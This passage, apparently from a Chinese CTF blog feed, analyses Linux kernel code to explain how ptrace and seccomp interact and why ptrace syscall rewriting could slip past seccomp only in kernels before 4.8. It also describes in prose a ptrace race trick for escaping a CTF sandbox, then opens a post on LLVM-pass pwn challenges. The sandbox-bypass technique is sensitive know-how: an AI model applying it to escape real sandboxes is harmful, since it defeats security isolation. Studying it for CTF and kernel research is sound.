class="type">atomic_inc</span>(&amp;current-&gt;seccomp.filter_count);</span><br></pre></td></tr></table></figure><p>current是一个全局的指针，指向当前进程的task结构体，主要保存了当前进程的一些信息。</p><p>所以，当我们注册seccomp，实际上就是设置了当前进程的filter规则。而什么时候根据这个规则进行过滤呢？</p><p>笔者将在syscall的分析中给出答案。</p><h3 id="ptrace">ptrace</h3><p>ptrace是用来跟踪进程的一个系统调用</p><p>当使用ptrace进行 <code>PTRACE_SYSCALL</code> 也就是一般我们劫持系统调用的操作时：</p><p>ptrace的调用链如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;PTRACE_SYSCALL </span><br><span class="line">--&gt;arch_ptrace</span><br><span class="line">--&gt;ptrace_request</span><br><span class="line">--&gt; ptrace_resume</span><br><span class="line">--&gt;set_task_syscall_work</span><br></pre></td></tr></table></figure><p>可以看到最终调用了<code>set_task_syscall_work</code> 宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_task_syscall_work(t, fl) \</span></span><br><span class="line"><span class="meta">set_bit(SYSCALL_WORK_BIT_##fl, &amp;task_thread_info(t)-&gt;syscall_work)</span></span><br></pre></td></tr></table></figure><p>这个宏通过task_thread_info获取了监视的进程的记录结构地址（当被监视进程运行时，此时current指针也指向这个结构，但是此时是监视程序运行时，所以通过task_thread_info取得其地址）</p><p>在获取结构体地址后设置了 <code>SYSCALL_WORK_BIT</code> ， 一个标志位，</p><p>也就是说，实际上ptrace:<code>PTRACE_SYSCALL</code> 和 prctl: <code>PR_SET_SECCOMP</code> 都只是在进程info上添加了一些信息，最终真正的处理要等到syscall中。</p><h2 id="syscall">syscall</h2><p>syscall 是如何处理 seccomp 以及ptrace 的呢？</p><p>其经过了如下调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--&gt;entry_SYSCALL_64</span><br><span class="line">--&gt;do_syscall_64</span><br><span class="line">--&gt;syscall_enter_from_user_mode</span><br><span class="line">--&gt;__syscall_enter_from_user_work</span><br><span class="line">--&gt;syscall_trace_enter</span><br></pre></td></tr></table></figure><p>syscall_trace_enter代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">syscall_trace_enter</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, <span class="type">long</span> syscall,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle Syscall User Dispatch.  This must comes first, since</span></span><br><span class="line"><span class="comment"> * the ABI here can be something that doesn&#x27;t make sense for</span></span><br><span class="line"><span class="comment"> * other syscall_work features.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_SYSCALL_USER_DISPATCH) &#123;</span><br><span class="line"><span class="keyword">if</span> (syscall_user_dispatch(regs))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Handle ptrace */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) &#123;</span><br><span class="line">ret = ptrace_report_syscall_entry(regs);</span><br><span class="line"><span class="keyword">if</span> (ret || (work &amp; SYSCALL_WORK_SYSCALL_EMU))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do seccomp after ptrace, to catch any tracer changes. */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_SECCOMP) &#123;</span><br><span class="line">ret = __secure_computing(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">-1L</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Either of the above might have changed the syscall number */</span></span><br><span class="line">syscall = syscall_get_nr(current, regs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(work &amp; SYSCALL_WORK_SYSCALL_TRACEPOINT))</span><br><span class="line">trace_sys_enter(regs, syscall);</span><br><span class="line"></span><br><span class="line">syscall_enter_audit(regs, syscall);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret ? : syscall;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中work由 <code>READ_ONCE(current_thread_info()-&gt;syscall_work)</code> 得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">long</span></span><br><span class="line">__syscall_enter_from_user_work(<span class="keyword">struct</span> pt_regs *regs, <span class="type">long</span> syscall)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> work = READ_ONCE(current_thread_info()-&gt;syscall_work);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (work &amp; SYSCALL_WORK_ENTER)</span><br><span class="line">syscall = syscall_trace_enter(regs, syscall, work);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由前面的分析我们可以知道， ptrace最终就是设置了<code>SYSCALL_WORK_BIT</code></p><p>也因此，这里的检测和处理，如注释所说的，就是处理我们在前面看到的seccomp和ptrace。</p><p>再看 <code>PTRACE_SYSCALL</code> 的实际处理函数 <code>ptrace_report_syscall</code>。</p><p>其中发送了SYSTRAP信号， 会让当前进程阻塞。等待ptrace的处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ptrace report for syscall entry and exit looks identical.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">ptrace_report_syscall</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> message)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ptrace = current-&gt;ptrace;</span><br><span class="line"><span class="type">int</span> signr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ptrace &amp; PT_PTRACED))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">signr = ptrace_notify(SIGTRAP | ((ptrace &amp; PT_TRACESYSGOOD) ? <span class="number">0x80</span> : <span class="number">0</span>),</span><br><span class="line">      message);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * this isn&#x27;t the same as continuing with a signal, but it will do</span></span><br><span class="line"><span class="comment"> * for normal use.  strace only continues with a signal if the</span></span><br><span class="line"><span class="comment"> * stopping signal is not SIGTRAP.  -brl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (signr)</span><br><span class="line">send_sig(signr, current, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fatal_signal_pending(current);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptrace_report_syscall_entry - task is about to attempt a system call</span></span><br><span class="line"><span class="comment"> * @regs:user register state of current task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This will be called if %SYSCALL_WORK_SYSCALL_TRACE or</span></span><br><span class="line"><span class="comment"> * %SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just</span></span><br><span class="line"><span class="comment"> * entered the kernel for a system call.  Full user register state is</span></span><br><span class="line"><span class="comment"> * available here.  Changing the values in @regs can affect the system</span></span><br><span class="line"><span class="comment"> * call number and arguments to be tried.  It is safe to block here,</span></span><br><span class="line"><span class="comment"> * preventing the system call from beginning.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns zero normally, or nonzero if the calling arch code should abort</span></span><br><span class="line"><span class="comment"> * the system call.  That must prevent normal entry so no system call is</span></span><br><span class="line"><span class="comment"> * made.  If @task ever returns to user mode after this, its register state</span></span><br><span class="line"><span class="comment"> * is unspecified, but should be something harmless like an %ENOSYS error</span></span><br><span class="line"><span class="comment"> * return.  It should preserve enough information so that syscall_rollback()</span></span><br><span class="line"><span class="comment"> * can work (see asm-generic/syscall.h).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called without locks, just after entering kernel mode.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> __must_check <span class="type">int</span> <span class="title function_">ptrace_report_syscall_entry</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ptrace_report_syscall(PTRACE_EVENTMSG_SYSCALL_ENTRY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正如注释所说，通过ptrace拦截系统调用后，对于寄存器的修改，都是在这个时间发生的。</p><blockquote><p>This will be called if %SYSCALL_WORK_SYSCALL_TRACE or<br>%SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just<br>entered the kernel for a system call.  Full user register state is<br>available here.  Changing the values in @regs can affect the system<br>call number and arguments to be tried.  It is safe to block here,<br>preventing the system call from beginning.&gt;</p></blockquote><p>而这一处理，在seccomp前面，所以即使通过ptrace拦截系统调用修改系统调用号后，seccomp还是会进行检查。</p><p>那为什么网上会有相关WP呢？</p><p>以下为linux-4.7的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can return 0 to resume the syscall or anything else to go to phase</span></span><br><span class="line"><span class="comment"> * 2.  If we resume the syscall, we need to put something appropriate in</span></span><br><span class="line"><span class="comment"> * regs-&gt;orig_ax.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NB: We don&#x27;t have full pt_regs here, but regs-&gt;orig_ax and regs-&gt;ax</span></span><br><span class="line"><span class="comment"> * are fully functional.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For phase 2&#x27;s benefit, our return value is:</span></span><br><span class="line"><span class="comment"> * 0:resume the syscall</span></span><br><span class="line"><span class="comment"> * 1:go to phase 2; no seccomp phase 2 needed</span></span><br><span class="line"><span class="comment"> * anything else:go to phase 2; pass return value to seccomp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">syscall_trace_enter_phase1</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, u32 arch)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span> =</span> pt_regs_to_thread_info(regs);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">u32 work;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_DEBUG_ENTRY))</span><br><span class="line">BUG_ON(regs != task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECCOMP</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do seccomp first -- it should minimize exposure of other</span></span><br><span class="line"><span class="comment"> * code, and keeping seccomp fast is probably more valuable</span></span><br><span class="line"><span class="comment"> * than the rest of this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (work &amp; _TIF_SECCOMP) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> <span class="title">sd</span>;</span></span><br><span class="line"></span><br><span class="line">sd.arch = arch;</span><br><span class="line">sd.nr = regs-&gt;orig_ax;</span><br><span class="line">sd.instruction_pointer = regs-&gt;ip;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="keyword">if</span> (arch == AUDIT_ARCH_X86_64) &#123;</span><br><span class="line">sd.args[<span class="number">0</span>] = regs-&gt;di;</span><br><span class="line">sd.args[<span class="number">1</span>] = regs-&gt;si;</span><br><span class="line">sd.args[<span class="number">2</span>] = regs-&gt;dx;</span><br><span class="line">sd.args[<span class="number">3</span>] = regs-&gt;r10;</span><br><span class="line">sd.args[<span class="number">4</span>] = regs-&gt;r8;</span><br><span class="line">sd.args[<span class="number">5</span>] = regs-&gt;r9;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">sd.args[<span class="number">0</span>] = regs-&gt;bx;</span><br><span class="line">sd.args[<span class="number">1</span>] = regs-&gt;cx;</span><br><span class="line">sd.args[<span class="number">2</span>] = regs-&gt;dx;</span><br><span class="line">sd.args[<span class="number">3</span>] = regs-&gt;si;</span><br><span class="line">sd.args[<span class="number">4</span>] = regs-&gt;di;</span><br><span class="line">sd.args[<span class="number">5</span>] = regs-&gt;bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BUILD_BUG_ON(SECCOMP_PHASE1_OK != <span class="number">0</span>);</span><br><span class="line">BUILD_BUG_ON(SECCOMP_PHASE1_SKIP != <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">ret = seccomp_phase1(&amp;sd);</span><br><span class="line"><span class="keyword">if</span> (ret == SECCOMP_PHASE1_SKIP) &#123;</span><br><span class="line">regs-&gt;orig_ax = <span class="number">-1</span>;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != SECCOMP_PHASE1_OK) &#123;</span><br><span class="line"><span class="keyword">return</span> ret;  <span class="comment">/* Go directly to phase 2 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">work &amp;= ~_TIF_SECCOMP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do our best to finish without phase 2. */</span></span><br><span class="line"><span class="keyword">if</span> (work == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;  <span class="comment">/* seccomp and/or nohz only (ret == 0 here) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AUDITSYSCALL</span></span><br><span class="line"><span class="keyword">if</span> (work == _TIF_SYSCALL_AUDIT) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If there is no more work to be done except auditing,</span></span><br><span class="line"><span class="comment"> * then audit in phase 1.  Phase 2 always audits, so, if</span></span><br><span class="line"><span class="comment"> * we audit here, then we can&#x27;t go on to phase 2.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">do_audit_syscall_entry(regs, arch);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">/* Something is enabled that we can&#x27;t handle in phase 1 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns the syscall nr to run (which should match regs-&gt;orig_ax). */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">syscall_trace_enter_phase2</span><span class="params">(<span class="keyword">struct</span> pt_regs *regs, u32 arch,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> phase1_result)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> *<span class="title">ti</span> =</span> pt_regs_to_thread_info(regs);</span><br><span class="line"><span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">u32 work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_DEBUG_ENTRY))</span><br><span class="line">BUG_ON(regs != task_pt_regs(current));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECCOMP</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call seccomp_phase2 before running the other hooks so that</span></span><br><span class="line"><span class="comment"> * they can see any changes made by a seccomp tracer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (phase1_result &gt; <span class="number">1</span> &amp;&amp; seccomp_phase2(phase1_result)) &#123;</span><br><span class="line"><span class="comment">/* seccomp failures shouldn&#x27;t expose any additional code. */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(work &amp; _TIF_SYSCALL_EMU))</span><br><span class="line">ret = <span class="number">-1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ret || test_thread_flag(TIF_SYSCALL_TRACE)) &amp;&amp;</span><br><span class="line">    tracehook_report_syscall_entry(regs))</span><br><span class="line">ret = <span class="number">-1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(test_thread_flag(TIF_SYSCALL_TRACEPOINT)))</span><br><span class="line">trace_sys_enter(regs, regs-&gt;orig_ax);</span><br><span class="line"></span><br><span class="line">do_audit_syscall_entry(regs, arch);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret ?: regs-&gt;orig_ax;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对<code>seccomp</code> 的处理在 <code>syscall_trace_enter_phase1</code>， 而处理<code>ptrace</code>的<code>tracehook_report_syscall_entry</code> 在<code>syscall_trace_enter_phase2</code></p><p>seccomp的过滤在ptrace之前。</p><p>所以，在4.8以下，这种攻击是可以实现的。</p><h2 id="Tricks">Tricks</h2><p>那么ptrace在绕过沙箱时是不是完全没有用了呢，也不是。</p><p>在和@cnitlrt 师傅交流后，得知了一个很骚操作的办法。</p><p>使用nc 连接两次，产生了两个进程，如果能在第二个进程运行前，通过ptrace截停prctl的调用，改成随便一个无关调用，就可以实现沙盒的绕过</p><p>这里存在三个问题：</p><p>首先是如何获得第二个进程的pid： 在CTF这种比较纯净的环境，可以认为两个进程PID相近，把当前进程的PID加1或者加2就可以。</p><p>其次是如何实现在第二次进程运行seccomp前的窗口期实现ptrace上此进程： 可以通过在一个进程使用ptrace attach轮询，直到执行成功返回1。不过也有失败的概率。</p><p>第三也是最终限制了这个tricks的使用的是，我们都知道，ptrace默认只能attach到自己的子进程，除非 <code>/proc/sys/kernel/yama/ptrace_scope</code> 设置为0， 在个人用户使用时，为了方便gdb等调试器，这个选项一般是0， 然而，当我随便开了个ubuntu的docker看了一下后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> proc/sys/kernel/yama/ptrace_scope</span>  </span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>啊这，这，那没事了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;Background&lt;/h2&gt;
&lt;p&gt;最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。&lt;/p&gt;
&lt;p&gt;正值校赛，为了出题的事忙得焦头烂额，就没有细想。&lt;/p&gt;
&lt;p&gt;但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的印象，我觉得他对于attach的子进程的寄存器的更改，&lt;s&gt;是在用户态实现的&lt;/s&gt;。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。&lt;/p&gt;
&lt;p&gt;在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.I wanna be a llvm passer</title>
    <link href="https://v3rdant.cn/Pwn.I-Wanna-be-A-LLVM-Passer/"/>
    <id>https://v3rdant.cn/Pwn.I-Wanna-be-A-LLVM-Passer/</id>
    <published>2023-06-22T16:00:00.000Z</published>
    <updated>2024-01-26T14:38:52.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="overview">overview</h1><p>华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。</p><p>首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。</p><span id="more"></span><p>ll和bc是llvm生成的IR的两种形式，分别是适合人类阅读的文本形式和二进制形式，可以用如下命令转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>由于笔者实机为Fedora, 所以笔者使用ubuntu docker 来安装llvm和clang，在需要调试时，<s>将相应共享库导入到本地，用patchelf来更改软链接</s>，还是在docker中配置调试环境比较方便.jpg</p><p>启动一个ubuntu:20.04的container，如下安装并配置好调试环境即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>opt就是所要pwn掉的对象，他是llvm的优化器，可以加载指定pass模块和exp对应ll代码，由于opt一般无PIE保护，所以一般通过覆盖got表来实现劫持控制流。自己安装的opt路径为<code>/usr/lib/llvm-xx/bin/opt</code></p><h1 id="so分析">so分析</h1><p>如何定位重写的 runOnFunction 函数呢?<br>首先定位到<code>.data.rel.ro</code> 段的vtable，其最后一项就是此函数。<br><img src="/images/20230630154515.png" alt="1"></p><p>另一种定位方法：</p><ul><li>首先找到注册的Pass的字符串。<br>这里IDA没有自动识别，将Hello字符串更改类型并命名<br><img src="images/20230630154611.png" alt><br>然后通过交叉引用找到Pass注册函数<br><img src="/images/20230630154751.png" alt><br>跟进sub_7e10<br><img src="/images/20230630155104.png" alt><br>跟进sub_7F90<br><img src="/images/20230630155140.png" alt><br>继续跟进<br><img src="images/20230630155156.png" alt></li></ul><p>此处unk_FD48即为虚表地址。</p><h2 